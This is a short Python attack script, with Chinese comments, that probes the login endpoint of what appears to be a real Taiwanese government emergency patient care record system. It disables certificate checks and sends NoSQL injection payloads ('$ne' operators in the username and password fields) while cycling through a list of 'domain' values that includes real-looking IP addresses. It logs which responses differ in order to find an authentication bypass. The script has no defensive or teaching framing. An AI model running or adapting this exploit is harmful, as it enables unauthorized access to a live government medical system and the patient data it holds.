import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    try:
        r=s.post(BASE+"/login",json=body,timeout=10); return r.status_code, r.text, dict(r.headers)
    except Exception as e: return None, repr(e), {}

print("=== $ne 多文档 + 遍历 domain (source 校验是否依赖 domain?) ===")
domains=["AUTH_SERVER","PORTAL","WEB","TPF","API","SYSTEM","ADMIN","localhost","epcr.tpf.gov.tw",
  "118.163.107.93","35.234.50.28","GOV","TPF_GOV","DISPATCH","EMT","AMBULANCE","EPCR","SERVICE",
  "MOBILE","DESKTOP","MAIN","DEFAULT","NULL","empty",""]
base={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1"}
seen={}
for d in domains:
    body={**base,"domain":d}
    code,t,h=login(body)
    sig=f"{code}:{len(t)}"
    mark="" if sig in seen else " [NEW]"
    seen[sig]=1
    print(f"  domain={str(d):18s} -> {code} len={len(t)} {mark} {t[:45]}")
    time.sleep(0.05)
print(f"\n=== 共 {len(seen)} 种不同响应 ===")
print("DONE")
